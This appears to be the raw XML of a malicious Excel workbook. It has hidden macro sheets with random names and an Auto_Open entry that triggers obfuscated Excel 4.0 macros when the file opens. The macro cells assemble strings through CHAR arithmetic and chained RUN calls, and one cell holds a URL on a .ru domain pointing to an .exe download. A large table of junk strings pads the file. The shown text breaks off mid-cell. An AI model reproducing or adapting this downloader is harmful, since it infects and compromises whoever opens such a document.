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macrosheets/sheet7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 filterPrivacy="1" defaultThemeVersion="124226"/>
  <bookViews>
    <workbookView xWindow="1560" yWindow="1560" windowWidth="15300" windowHeight="7875" firstSheet="7" activeTab="7"/>
  </bookViews>
  <sheets>
    <sheet name="jfToeVjtcc" sheetId="2" state="hidden" r:id="rId1"/>
    <sheet name="wRtyMWrFseGcbDkCnr" sheetId="3" state="hidden" r:id="rId2"/>
    <sheet name="Macro2" sheetId="4" state="hidden" r:id="rId3"/>
    <sheet name="Macro3" sheetId="5" state="hidden" r:id="rId4"/>
    <sheet name="Macro4" sheetId="6" state="hidden" r:id="rId5"/>
    <sheet name="Macro5" sheetId="7" state="hidden" r:id="rId6"/>
    <sheet name="Macro6" sheetId="8" state="hidden" r:id="rId7"/>
    <sheet name="Sheet1" sheetId="1" r:id="rId8"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open">jfToeVjtcc!$EQ$244</definedName>
  </definedNames>
  <calcPr calcId="1222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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="402" uniqueCount="402">
  <si>
    <t>SrExQNj</t>
  </si>
  <si>
    <t>gGxtFWlHuEbWzCiCIQF</t>
  </si>
  <si>
    <t>ktusxVbi</t>
  </si>
  <si>
    <t>NaZptvnNcUFmoJlq</t>
  </si>
  <si>
    <t>EBjwWWxHTuPtSkKk</t>
  </si>
  <si>
    <t>vpIqOxIOK</t>
  </si>
  <si>
    <t>WmCJLU</t>
  </si>
  <si>
    <t>rmQSyFYgV</t>
  </si>
  <si>
    <t>BwwvB</t>
  </si>
  <si>
    <t>HNUlMLbRULkN</t>
  </si>
  <si>
    <t>sqYNhXOcmVVII</t>
  </si>
  <si>
    <t>jrFgBfEVhWTNfcyit</t>
  </si>
  <si>
    <t>zvHYZuwGdKnE</t>
  </si>
  <si>
    <t>kqKSHmiiglXQXCcO</t>
  </si>
  <si>
    <t>dhkcBeJsodxnesDllY</t>
  </si>
  <si>
    <t>LmJVjR</t>
  </si>
  <si>
    <t>iUYxm</t>
  </si>
  <si>
    <t>LFXUrNl</t>
  </si>
  <si>
    <t>rnzDRmoxIDfvOiCvlRa</t>
  </si>
  <si>
    <t>aZePIPtHGWZcUsIB</t>
  </si>
  <si>
    <t>kTVpSXkuQdRDeBzb</t>
  </si>
  <si>
    <t>JaMQqQbVn</t>
  </si>
  <si>
    <t>kIdCuqCTh</t>
  </si>
  <si>
    <t>DqBYTwxeyEMChqqpuR</t>
  </si>
  <si>
    <t>YfKXWmpskJYRBjlG</t>
  </si>
  <si>
    <t>EIWTCPooQYkNgM</t>
  </si>
  <si>
    <t>kCbCNHZJfPafcnFT</t>
  </si>
  <si>
    <t>bclKFhjQWpxnT</t>
  </si>
  <si>
    <t>OPNSDKRhJ</t>
  </si>
  <si>
    <t>IYOQIhKomVJeU</t>
  </si>
  <si>
    <t>LZjSSFFgoCd</t>
  </si>
  <si>
    <t>wcBSeSQKcZ</t>
  </si>
  <si>
    <t>vfqwsEVWrsDaHkz</t>
  </si>
  <si>
    <t>IPipfLGHFKvovaBm</t>
  </si>
  <si>
    <t>CGJzZChRNCWMDRb</t>
  </si>
  <si>
    <t>KKwjLgtIpHswWLICU</t>
  </si>
  <si>
    <t>RoKiokvzO</t>
  </si>
  <si>
    <t>jluFycsLfys</t>
  </si>
  <si>
    <t>iOXXWaMFMqDDSWZRpF</t>
  </si>
  <si>
    <t>xhPSmPThrNaNzbxvYGX</t>
  </si>
  <si>
    <t>JNmNYSkhF</t>
  </si>
  <si>
    <t>ayqnyQ</t>
  </si>
  <si>
    <t>ZuisQLopWqvEtZiihm</t>
  </si>
  <si>
    <t>JQXCPOehkc</t>
  </si>
  <si>
    <t>BQJsbdxafsp</t>
  </si>
  <si>
    <t>YlLLm</t>
  </si>
  <si>
    <t>uIjDiHYyZkewfC</t>
  </si>
  <si>
    <t>lwDyKbqxyJgbFHmtNVK</t>
  </si>
  <si>
    <t>plljoagnFfeu</t>
  </si>
  <si>
    <t>MPHfJnlTIcSJXhQQD</t>
  </si>
  <si>
    <t>Denzb</t>
  </si>
  <si>
    <t>vayRcROIaXueouqDTU</t>
  </si>
  <si>
    <t>prBYGiyflFNC</t>
  </si>
  <si>
    <t>hddchSLSwXJZc</t>
  </si>
  <si>
    <t>fXvZEnjYsjZnxggTGhE</t>
  </si>
  <si>
    <t>QeMdPTtheYqnLgF</t>
  </si>
  <si>
    <t>LHTWkGIRbWzPhCVPFkt</t>
  </si>
  <si>
    <t>POSEwEiuuKORJhwpZHK</t>
  </si>
  <si>
    <t>eHLZjFSFrTpnQxPBF</t>
  </si>
  <si>
    <t>eFQKcZwSqifqI</t>
  </si>
  <si>
    <t>WrfoNIkmTns</t>
  </si>
  <si>
    <t>BqWffejGNUyM</t>
  </si>
  <si>
    <t>LbehZx</t>
  </si>
  <si>
    <t>NGpYauXbpmViIIjrEgz</t>
  </si>
  <si>
    <t>fEVvVgascyitzvH</t>
  </si>
  <si>
    <t>zOWXh</t>
  </si>
  <si>
    <t>FzdeLSk</t>
  </si>
  <si>
    <t>siOJKINyFMcEDT</t>
  </si>
  <si>
    <t>JMDcFkiQFZPG</t>
  </si>
  <si>
    <t>UeNNzzb</t>
  </si>
  <si>
    <t>jwYsXvNZOLFXUq</t>
  </si>
  <si>
    <t>alrnyQRm</t>
  </si>
  <si>
    <t>oxVCfvciCKyeaaYdPI</t>
  </si>
  <si>
    <t>PtUGVZ</t>
  </si>
  <si>
    <t>woOqVGCpLBrGQ</t>
  </si>
  <si>
    <t>yylYyV</t>
  </si>
  <si>
    <t>iwduh</t>
  </si>
  <si>
    <t>lLywqJ</t>
  </si>
  <si>
    <t>GcyXdZknDY</t>
  </si>
  <si>
    <t>ZjsnRgzUmhXD</t>
  </si>
  <si>
    <t>LMKPBtBerqHLOFetm</t>
  </si>
  <si>
    <t>WEHbEIWgB</t>
  </si>
  <si>
    <t>qdQrNMoWn</t>
  </si>
  <si>
    <t>ZdDdoiBxVqPHE</t>
  </si>
  <si>
    <t>PguQENlfJLrMRZPu</t>
  </si>
  <si>
    <t>EEDHelsXjjyDGx</t>
  </si>
  <si>
    <t>WleOvyT</t>
  </si>
  <si>
    <t>vzOLtHg</t>
  </si>
  <si>
    <t>gIQcFYEbtTtFyRBX</t>
  </si>
  <si>
    <t>HSXUfw</t>
  </si>
  <si>
    <t>gnpyWRuwdjDLBgb</t>
  </si>
  <si>
    <t>cafQXeuVV</t>
  </si>
  <si>
    <t>kadVtXCzhWqhYlvfeS</t>
  </si>
  <si>
    <t>StCOqKpNfrfdXpmJs</t>
  </si>
  <si>
    <t>EJGRijFGP</t>
  </si>
  <si>
    <t>nUxNtzTbRwrsqvgZgL</t>
  </si>
  <si>
    <t>lXnrtlLnSDxmHx</t>
  </si>
  <si>
    <t>oCNvuiUvSe</t>
  </si>
  <si>
    <t>UCTGKjXVPheB</t>
  </si>
  <si>
    <t>XvCxJMbwx</t>
  </si>
  <si>
    <t>IRMpFYsLGuajkinYSZ</t>
  </si>
  <si>
    <t>DQPfjmdDSKuce</t>
  </si>
  <si>
    <t>zcguF</t>
  </si>
  <si>
    <t>ZnaNnKJlSkWaz</t>
  </si>
  <si>
    <t>alfxuRnM</t>
  </si>
  <si>
    <t>EzMcr</t>
  </si>
  <si>
    <t>IvFdXBDjEJRHmv</t>
  </si>
  <si>
    <t>vuyWdkPbb</t>
  </si>
  <si>
    <t>quxpOdWGnqLnrG</t>
  </si>
  <si>
    <t>DlyYYzIUwQvTlLlwq</t>
  </si>
  <si>
    <t>JsPyKPMXoDLMVtoRTz</t>
  </si>
  <si>
    <t>GZhXDxywCmtBRsrI</t>
  </si>
  <si>
    <t>xzrRtY</t>
  </si>
  <si>
    <t>WFsNEuJTCBooQYkNg</t>
  </si>
  <si>
    <t>nMdpdbVnkHqCI</t>
  </si>
  <si>
    <t>EPghD</t>
  </si>
  <si>
    <t>EOlSvLryRZPupqotfYf</t>
  </si>
  <si>
    <t>KkVlp</t>
  </si>
  <si>
    <t>sjJlRBwlGvmBLtt</t>
  </si>
  <si>
    <t>gTtQdrZqcgGur</t>
  </si>
  <si>
    <t>lEBXtSYUfjxTVeniM</t>
  </si>
  <si>
    <t>wQjDxm</t>
  </si>
  <si>
    <t>SbcafQKRuIHXbdVuKCm</t>
  </si>
  <si>
    <t>UWrUYmwRfSFfCBdKcOS</t>
  </si>
  <si>
    <t>rSdXpmJ</t>
  </si>
  <si>
    <t>fEvrEUjF</t>
  </si>
  <si>
    <t>sCZUxzg</t>
  </si>
  <si>
    <t>BGOEjrsqvTahMYXnru</t>
  </si>
  <si>
    <t>OmCueMPjMQeaKXwwY</t>
  </si>
  <si>
    <t>gsVoUr</t>
  </si>
  <si>
    <t>KjKVP</t>
  </si>
  <si>
    <t>hRnXi</t>
  </si>
  <si>
    <t>nkvNbjkt</t>
  </si>
  <si>
    <t>SMprYexGvbWXVaL</t>
  </si>
  <si>
    <t>SZpQQgWYQpSwucR</t>
  </si>
  <si>
    <t>lcTgraZNNowJlF</t>
  </si>
  <si>
    <t>GdvIvsnFDZJTZ</t>
  </si>
  <si>
    <t>VhyyVWfD</t>
  </si>
  <si>
    <t>kOdKQjrhN</t>
  </si>
  <si>
    <t>IJHMwpwbC</t>
  </si>
  <si>
    <t>nEHKCbEiTO</t>
  </si>
  <si>
    <t>DXOFSc</t>
  </si>
  <si>
    <t>MLykMiuJqI</t>
  </si>
  <si>
    <t>VZznlfxuRnM</t>
  </si>
  <si>
    <t>ROZcr</t>
  </si>
  <si>
    <t>NOXhcGVoIbWLqz</t>
  </si>
  <si>
    <t>ByEohpTgfvzCtTia</t>
  </si>
  <si>
    <t>LsuPrwLVpDqdEaZCizm</t>
  </si>
  <si>
    <t>qQqCvOLhE</t>
  </si>
  <si>
    <t>cUQcsIdRaxs</t>
  </si>
  <si>
    <t>rtatzIwcl</t>
  </si>
  <si>
    <t>mkpNTaFSRhln</t>
  </si>
  <si>
    <t>fFUMwegB</t>
  </si>
  <si>
    <t>divsboOO</t>
  </si>
  <si>
    <t>pxLmHl</t>
  </si>
  <si>
    <t>KbCcnhziGpzGCOe</t>
  </si>
  <si>
    <t>tBDMjeIKqwQYNsoo</t>
  </si>
  <si>
    <t>PUFMTjKJZPS</t>
  </si>
  <si>
    <t>KiMqoWLfWNakTTHHhqD</t>
  </si>
  <si>
    <t>fyeCUgURLdaxhrxt</t>
  </si>
  <si>
    <t>GWXsuEbJ</t>
  </si>
  <si>
    <t>mCioIQGlggfkVOV</t>
  </si>
  <si>
    <t>zaMcfi</t>
  </si>
  <si>
    <t>VuXCmhWqhYl</t>
  </si>
  <si>
    <t>wfeSEfCOcKbNRrfd</t>
  </si>
  <si>
    <t>XpmJfEJ</t>
  </si>
  <si>
    <t>GRUjFGPZ</t>
  </si>
  <si>
    <t>UxNgzT</t>
  </si>
  <si>
    <t>ODirsqvgZh</t>
  </si>
  <si>
    <t>LYXnrt</t>
  </si>
  <si>
    <t>NmCteMOjMQeoJXKwX</t>
  </si>
  <si>
    <t>tsVCTGKjKVPheBXvnj</t>
  </si>
  <si>
    <t>vMbwktRMpr</t>
  </si>
  <si>
    <t>YsxGvbjkin</t>
  </si>
  <si>
    <t>LSZDQPfjmdDSLucfzc</t>
  </si>
  <si>
    <t>guqZnN</t>
  </si>
  <si>
    <t>NnwJl</t>
  </si>
  <si>
    <t>aFdvVvHBTCZJTZVhx</t>
  </si>
  <si>
    <t>NUWfDxbdKQjrg</t>
  </si>
  <si>
    <t>MIIHMwELb</t>
  </si>
  <si>
    <t>CBRHKCaEigODXOE</t>
  </si>
  <si>
    <t>ScLLxy</t>
  </si>
  <si>
    <t>ZiuXqWtMYMJDVSpZjp</t>
  </si>
  <si>
    <t>lxOPkmvTBetagzI</t>
  </si>
  <si>
    <t>ZFzByEohoTtfv</t>
  </si>
  <si>
    <t>yCtSv</t>
  </si>
  <si>
    <t>aLGuPGwKUEDqcEamBi</t>
  </si>
  <si>
    <t>zlpQECvO</t>
  </si>
  <si>
    <t>LhDchepsIde</t>
  </si>
  <si>
    <t>nxsWlFYrmbHQ</t>
  </si>
  <si>
    <t>RPUFxFjwvMQSKjyqbJL</t>
  </si>
  <si>
    <t>fINalGTHsUqpRy</t>
  </si>
  <si>
    <t>lXbCbmgywToN</t>
  </si>
  <si>
    <t>GCNesPCM</t>
  </si>
  <si>
    <t>jeIJpKPXNsCDBG</t>
  </si>
  <si>
    <t>djqVih</t>
  </si>
  <si>
    <t>xBEvVjcN</t>
  </si>
  <si>
    <t>uwRtyM</t>
  </si>
  <si>
    <t>JrFeeGO</t>
  </si>
  <si>
    <t>bDXCarSsEx</t>
  </si>
  <si>
    <t>raxhrx</t>
  </si>
  <si>
    <t>tGWlsuEbWzCio</t>
  </si>
  <si>
    <t>IQFkggfjVb</t>
  </si>
  <si>
    <t>jzaZpfiaycH</t>
  </si>
  <si>
    <t>FmbvlcqBjjW</t>
  </si>
  <si>
    <t>XxHTvPtSkv</t>
  </si>
  <si>
    <t>khbtqOxIOKWmnJL</t>
  </si>
  <si>
    <t>UrZCSyF</t>
  </si>
  <si>
    <t>tCqWSSQVHzHlMxNRUMk</t>
  </si>
  <si>
    <t>OscYNhXOcmVVIuWrFTB</t>
  </si>
  <si>
    <t>SEIhWTNfczVtzv</t>
  </si>
  <si>
    <t>ILZuwGQK</t>
  </si>
  <si>
    <t>nEWqKEt</t>
  </si>
  <si>
    <t>ZiihlXQX</t>
  </si>
  <si>
    <t>COOehkcBQJsad</t>
  </si>
  <si>
    <t>xaesDYlYLmJHj</t>
  </si>
  <si>
    <t>sKvza</t>
  </si>
  <si>
    <t>zLFXUrNl</t>
  </si>
  <si>
    <t>ealDRmakIDghOinvl</t>
  </si>
  <si>
    <t>RaaZeBIPtHGWZcUsI</t>
  </si>
  <si>
    <t>BkTVpS</t>
  </si>
  <si>
    <t>XkhQdDDemzbuayQqRcW</t>
  </si>
  <si>
    <t>jSpZjplw</t>
  </si>
  <si>
    <t>OdkmvTOr</t>
  </si>
  <si>
    <t>tagzIw</t>
  </si>
  <si>
    <t>cYYXbNTar</t>
  </si>
  <si>
    <t>SRhXaSqUyweTndU</t>
  </si>
  <si>
    <t>isbbOPpyLmHlKcncZT</t>
  </si>
  <si>
    <t>liGpzGCOef</t>
  </si>
  <si>
    <t>cenLsWlSYrzpVQQP</t>
  </si>
  <si>
    <t>UFxFjKvMPSKiMqaW</t>
  </si>
  <si>
    <t>LfWNakTTHsUqDRy</t>
  </si>
  <si>
    <t>QCGgUSMdbxTrxtGJXtu</t>
  </si>
  <si>
    <t>EOJmCUoICrXghfkV</t>
  </si>
  <si>
    <t>OVzNMcfi</t>
  </si>
  <si>
    <t>azOHrZbvY</t>
  </si>
  <si>
    <t>dqBWjXJkHGhPgSWw</t>
  </si>
  <si>
    <t>rDwPMjFdWSduJ</t>
  </si>
  <si>
    <t>eSczuYZGafndJSS</t>
  </si>
  <si>
    <t>RWszHlyxORUMkz</t>
  </si>
  <si>
    <t>scLNhKPcZIVuuWer</t>
  </si>
  <si>
    <t>TmSqIiIU</t>
  </si>
  <si>
    <t>OfPlVg</t>
  </si>
  <si>
    <t>mitLZhisQ</t>
  </si>
  <si>
    <t>LoqWdvEtZUVT</t>
  </si>
  <si>
    <t>zlryQqpGvyqPsXVDr</t>
  </si>
  <si>
    <t>MCsHRzzm</t>
  </si>
  <si>
    <t>mOWjLfKizM</t>
  </si>
  <si>
    <t>BxrKHeOYeamDEZbkIoS</t>
  </si>
  <si>
    <t>iPVowlR</t>
  </si>
  <si>
    <t>NNMRCuCgHsJMPHfJn</t>
  </si>
  <si>
    <t>XTIcSJXhQQDpR</t>
  </si>
  <si>
    <t>nzOvNyDcROI</t>
  </si>
  <si>
    <t>aXuQouqDGUprBL</t>
  </si>
  <si>
    <t>aEUmHaUKpyywCngnSe</t>
  </si>
  <si>
    <t>etxBsRgZ</t>
  </si>
  <si>
    <t>JqtOquJT</t>
  </si>
  <si>
    <t>oCobDZXzh</t>
  </si>
  <si>
    <t>ykoOoztM</t>
  </si>
  <si>
    <t>JgCaSP</t>
  </si>
  <si>
    <t>arGbPYwqUWDXcka</t>
  </si>
  <si>
    <t>GPPOTpwEiu</t>
  </si>
  <si>
    <t>Wmpsk</t>
  </si>
  <si>
    <t>JYRBjl</t>
  </si>
  <si>
    <t>GinBxgtTTuDQrLqPgH</t>
  </si>
  <si>
    <t>grlEnKtFLHS</t>
  </si>
  <si>
    <t>jxGHRojNOuCUcS</t>
  </si>
  <si>
    <t>xstrwhovMnmDsvmMoUR</t>
  </si>
  <si>
    <t>znJypEOwwj</t>
  </si>
  <si>
    <t>jLTgIbHfwJxu</t>
  </si>
  <si>
    <t>oHEaKVbXizB</t>
  </si>
  <si>
    <t>rsCaHkzgmGOEjefdiTM</t>
  </si>
  <si>
    <t>UxZKaegYxa</t>
  </si>
  <si>
    <t>FplZtkbp</t>
  </si>
  <si>
    <t>ziiVIiFSg</t>
  </si>
  <si>
    <t>NeRVuigaspMiHNJUXmI</t>
  </si>
  <si>
    <t>JTcXBQjEWRGmu</t>
  </si>
  <si>
    <t>vtyjdkObaquxoOdWGnp</t>
  </si>
  <si>
    <t>mPThrNaN</t>
  </si>
  <si>
    <t>zawvYGXJ</t>
  </si>
  <si>
    <t>NmNYSkhEayqmyQeznwU</t>
  </si>
  <si>
    <t>PsubvBJyen</t>
  </si>
  <si>
    <t>nmqOVcHTTimphGVOxf</t>
  </si>
  <si>
    <t>iDfjxudqQQrzM</t>
  </si>
  <si>
    <t>oInLdDdoiBk</t>
  </si>
  <si>
    <t>DmwDy</t>
  </si>
  <si>
    <t>LbqxzJgbFHntNV</t>
  </si>
  <si>
    <t>Lqllkpa</t>
  </si>
  <si>
    <t>hoFffuknfEhMKrg</t>
  </si>
  <si>
    <t>BrivGpoc</t>
  </si>
  <si>
    <t>cEMYBUzXpC</t>
  </si>
  <si>
    <t>pnhzwTD</t>
  </si>
  <si>
    <t>purDUVqrBZG</t>
  </si>
  <si>
    <t>jyflFNDidech</t>
  </si>
  <si>
    <t>SLSwYJZ</t>
  </si>
  <si>
    <t>dfXwZEokYsjaoyhgUH</t>
  </si>
  <si>
    <t>hEQeMdQUthfZroLhGMI</t>
  </si>
  <si>
    <t>TWlHISb</t>
  </si>
  <si>
    <t>rVkDXqkaGPQOTEwEi</t>
  </si>
  <si>
    <t>vuLPRJ</t>
  </si>
  <si>
    <t>iwpaI</t>
  </si>
  <si>
    <t>KeHMZkFSGrT</t>
  </si>
  <si>
    <t>poQxPBFfGRL</t>
  </si>
  <si>
    <t>dCYuTLHTjyUIRojNP</t>
  </si>
  <si>
    <t>vPVdSxHIGL</t>
  </si>
  <si>
    <t>ipwanmDHJBap</t>
  </si>
  <si>
    <t>hSzCXzESOwLjkLUg</t>
  </si>
  <si>
    <t>JcHfxXxJDVEbLVbXjz</t>
  </si>
  <si>
    <t>PWYhFz</t>
  </si>
  <si>
    <t>yBhnH</t>
  </si>
  <si>
    <t>PEjffe</t>
  </si>
  <si>
    <t>iUahyZY</t>
  </si>
  <si>
    <t>oehZxbGEl</t>
  </si>
  <si>
    <t>aukbpziiVVwGStOsRj</t>
  </si>
  <si>
    <t>WLICURoYiokwNOjlu</t>
  </si>
  <si>
    <t>SzcsZfyHvc</t>
  </si>
  <si>
    <t>XXWbMFM</t>
  </si>
  <si>
    <t>qRDTWZRpTxhdSmd</t>
  </si>
  <si>
    <t>UhraaOzbxKYG</t>
  </si>
  <si>
    <t>seiIwtnGDavUaWi</t>
  </si>
  <si>
    <t>lzVXgqkOe</t>
  </si>
  <si>
    <t>wRkeUzJJINxqxcoo</t>
  </si>
  <si>
    <t>FILDbqjTBEYB</t>
  </si>
  <si>
    <t>FTdyMylNjhKrJuyYyKE</t>
  </si>
  <si>
    <t>WTqMkd</t>
  </si>
  <si>
    <t>ZkCQlZjHCegN</t>
  </si>
  <si>
    <t>JOWMrBBzFbipUhgwzD</t>
  </si>
  <si>
    <t>uTibLtv</t>
  </si>
  <si>
    <t>QsxLIqEddFNaC</t>
  </si>
  <si>
    <t>VBZqRrDwP</t>
  </si>
  <si>
    <t>xUEPV</t>
  </si>
  <si>
    <t>RctJQRbytXZFMfnc</t>
  </si>
  <si>
    <t>IEECHsyGXx</t>
  </si>
  <si>
    <t>rIxBsRuZXFt</t>
  </si>
  <si>
    <t>OEuJTCCopQZlOh</t>
  </si>
  <si>
    <t>MkDODztMJgQag</t>
  </si>
  <si>
    <t>coFGbdmKrUkRXqy</t>
  </si>
  <si>
    <t>nTPPOTEwE</t>
  </si>
  <si>
    <t>iJuLORJhLpZVKe</t>
  </si>
  <si>
    <t>VMZjS</t>
  </si>
  <si>
    <t>thTuRd</t>
  </si>
  <si>
    <t>rZqcgHusmFC</t>
  </si>
  <si>
    <t>YtSYUgjyUVeojNcuPi</t>
  </si>
  <si>
    <t>cSxHIGLv</t>
  </si>
  <si>
    <t>ovanmDGJBaohSzC</t>
  </si>
  <si>
    <t>WyERcwKxjLhgIpHsw</t>
  </si>
  <si>
    <t>XxJDVSoLjbXizPkYh</t>
  </si>
  <si>
    <t>FzdfMfltiOXYW</t>
  </si>
  <si>
    <t>wTahMZYor</t>
  </si>
  <si>
    <t>umLaTDlnIkpDzivV</t>
  </si>
  <si>
    <t>VwFStNsRiJj</t>
  </si>
  <si>
    <t>uoHpM</t>
  </si>
  <si>
    <t>vHNJU</t>
  </si>
  <si>
    <t>lBIJTqlPRwEXe</t>
  </si>
  <si>
    <t>Uzuvtykq</t>
  </si>
  <si>
    <t>xPpoFuxoOqWUCqLBrGQ</t>
  </si>
  <si>
    <t>aaNNoxKlGkJbmbYS</t>
  </si>
  <si>
    <t>khFoyFBNdezCLiPsJpv</t>
  </si>
  <si>
    <t>PXMrnnmrcVcHh</t>
  </si>
  <si>
    <t>TjmphGjOxtiDsjxIq</t>
  </si>
  <si>
    <t>qdQrOaoWnZdEro</t>
  </si>
  <si>
    <t>iBxVqPVRdguQSblgK</t>
  </si>
  <si>
    <t>ZrMfZPu</t>
  </si>
  <si>
    <t>ZZXcOHOs</t>
  </si>
  <si>
    <t>FFUYbTrHzj</t>
  </si>
  <si>
    <t>RUoRVjtPcPCdz</t>
  </si>
  <si>
    <t>xaIZLPoPaUmjHcBs</t>
  </si>
  <si>
    <t>pBSgCpyXSuwdxD</t>
  </si>
  <si>
    <t>LBgppotQXeJWVlor</t>
  </si>
  <si>
    <t>jIXQzikFhlzwfsS</t>
  </si>
  <si>
    <t>tVdqSlRpHhHSMeOkUfl</t>
  </si>
  <si>
    <t>hsKYg</t>
  </si>
  <si>
    <t>hrPKn</t>
  </si>
  <si>
    <t>oVcuDsYT</t>
  </si>
  <si>
    <t>USXJPWm</t>
  </si>
  <si>
    <t>ONdTWNmPur</t>
  </si>
  <si>
    <t>aOjZQeoXXKKltHiDh</t>
  </si>
  <si>
    <t>GXjYVPheBkvC</t>
  </si>
  <si>
    <t>TevwST</t>
  </si>
  <si>
    <t>cBhLaHNgoeKFGEJtm</t>
  </si>
  <si>
    <t>uYzkBFHyYBfQ</t>
  </si>
  <si>
    <t>MzVLCQaJJ</t>
  </si>
  <si>
    <t>XKkHUiPh</t>
  </si>
  <si>
    <t>TXwlicurOkJPLWZ</t>
  </si>
  <si>
    <t>oKLVeZDTlGZTJ</t>
  </si>
  <si>
    <t>owxvBmfm</t>
  </si>
  <si>
    <t>RddswzrQfY</t>
  </si>
  <si>
    <t>IpsNptISn</t>
  </si>
  <si>
    <t>BnaCXWygxjnNny</t>
  </si>
  <si>
    <t>nGDavUMJU</t>
  </si>
  <si>
    <t>lzVJSqlOQwRWe</t>
  </si>
  <si>
    <t>UzJJINjq</t>
  </si>
  <si>
    <t>xcpoFILDbqjTCE</t>
  </si>
  <si>
    <t>YBGTQyMllNV</t>
  </si>
  <si>
    <t>iKdJhyZyKEWGcM</t>
  </si>
  <si>
    <t>XdZkCQYZ</t>
  </si>
  <si>
    <t>jHCfgNUm</t>
  </si>
  <si>
    <t>WMrmnlqcipHh</t>
  </si>
  <si>
    <t>gwmpgGiOMtiD</t>
  </si>
  <si>
    <t>sjxIqqddFNaCWBZq</t>
  </si>
  <si>
    <t>DroiBxUEPV</t>
  </si>
  <si>
    <t>RctuQSbyfJ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</si>
</sst>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1.xml"/><Relationship Id="rId3" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet3.xml"/><Relationship Id="rId7" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet7.xml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sharedStrings" Target="sharedStrings.xml"/><Relationship Id="rId5" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet5.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId4" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macro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571500</xdr:colOff>
      <xdr:row>21</xdr:row>
      <xdr:rowOff>57150</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="1026" name="Picture 1">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" xmlns="" id="{5A937D63-056E-46D4-8E30-96264735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496300" cy="405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4:IO1998"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="4" spans="40:246" x14ac:dyDescent="0.25">
      <c r="BF4" t="b">
        <f>RUN($BV$955)</f>
        <v>0</v>
      </c>
    </row>
    <row r="6" spans="40:246" x14ac:dyDescent="0.25">
      <c r="AN6">
        <v>11</v>
      </c>
    </row>
    <row r="9" spans="40:246" x14ac:dyDescent="0.25">
      <c r="CJ9">
        <v>685</v>
      </c>
    </row>
    <row r="10" spans="40:246" x14ac:dyDescent="0.25">
      <c r="BK10">
        <v>90</v>
      </c>
    </row>
    <row r="13" spans="40:246" x14ac:dyDescent="0.25">
      <c r="AN13">
        <v>73</v>
      </c>
      <c r="DW13">
        <v>61</v>
      </c>
    </row>
    <row r="14" spans="40:246" x14ac:dyDescent="0.25">
      <c r="IL14">
        <v>29</v>
      </c>
    </row>
    <row r="19" spans="23:217" x14ac:dyDescent="0.25">
      <c r="DV19">
        <v>663</v>
      </c>
    </row>
    <row r="22" spans="23:217" x14ac:dyDescent="0.25">
      <c r="W22" t="b">
        <f>RUN($T$477)</f>
        <v>0</v>
      </c>
    </row>
    <row r="23" spans="23:217" x14ac:dyDescent="0.25">
      <c r="AW23">
        <v>62</v>
      </c>
    </row>
    <row r="28" spans="23:217" x14ac:dyDescent="0.25">
      <c r="HI28" t="str">
        <f>CHAR($W$942-14)</f>
        <v>r</v>
      </c>
    </row>
    <row r="30" spans="23:217" x14ac:dyDescent="0.25">
      <c r="GO30" t="str">
        <f>CHAR($ID$186-58)</f>
        <v>P</v>
      </c>
    </row>
    <row r="31" spans="23:217" x14ac:dyDescent="0.25">
      <c r="FL31" t="str">
        <f>CONCATENATE($GJ$1021)</f>
        <v>Open</v>
      </c>
    </row>
    <row r="32" spans="23:217" x14ac:dyDescent="0.25">
      <c r="GC32">
        <v>2</v>
      </c>
    </row>
    <row r="36" spans="14:234" x14ac:dyDescent="0.25">
      <c r="HH36" t="str">
        <f>CHAR($HL$458-563)</f>
        <v>u</v>
      </c>
    </row>
    <row r="39" spans="14:234" x14ac:dyDescent="0.25">
      <c r="AV39" t="str">
        <f>CHAR($CB$132-563)</f>
        <v>u</v>
      </c>
      <c r="EO39" t="str">
        <f>CHAR($N$176-563)</f>
        <v>z</v>
      </c>
    </row>
    <row r="40" spans="14:234" x14ac:dyDescent="0.25">
      <c r="HZ40" t="b">
        <f>RUN($DP$1916)</f>
        <v>0</v>
      </c>
    </row>
    <row r="41" spans="14:234" x14ac:dyDescent="0.25">
      <c r="GS41">
        <v>1018</v>
      </c>
    </row>
    <row r="43" spans="14:234" x14ac:dyDescent="0.25">
      <c r="BJ43">
        <v>72</v>
      </c>
    </row>
    <row r="44" spans="14:234" x14ac:dyDescent="0.25">
      <c r="N44" t="b">
        <f>RUN($HH$1157)</f>
        <v>0</v>
      </c>
      <c r="AP44" t="b">
        <f>RUN($DI$424)</f>
        <v>0</v>
      </c>
      <c r="CZ44" t="b">
        <f>RUN($DY$636)</f>
        <v>0</v>
      </c>
    </row>
    <row r="48" spans="14:234" x14ac:dyDescent="0.25">
      <c r="DF48">
        <v>9</v>
      </c>
    </row>
    <row r="49" spans="52:203" x14ac:dyDescent="0.25">
      <c r="CT49">
        <v>12</v>
      </c>
    </row>
    <row r="52" spans="52:203" x14ac:dyDescent="0.25">
      <c r="BV52">
        <v>80</v>
      </c>
    </row>
    <row r="53" spans="52:203" x14ac:dyDescent="0.25">
      <c r="CZ53" t="b">
        <f>RUN($EQ$244)</f>
        <v>0</v>
      </c>
      <c r="GU53">
        <v>124</v>
      </c>
    </row>
    <row r="54" spans="52:203" x14ac:dyDescent="0.25">
      <c r="BB54" t="str">
        <f>$FU$213</f>
        <v>http://invoice7mukszq9nbpa7online.ru/unfeminized.exe</v>
      </c>
      <c r="BK54">
        <v>61</v>
      </c>
      <c r="GK54" t="b">
        <f>RUN($ID$1902)</f>
        <v>0</v>
      </c>
    </row>
    <row r="55" spans="52:203" x14ac:dyDescent="0.25">
      <c r="EO55">
        <v>4</v>
      </c>
    </row>
    <row r="58" spans="52:203" x14ac:dyDescent="0.25">
      <c r="AZ58" t="str">
        <f>CHAR($HX$1095-14)</f>
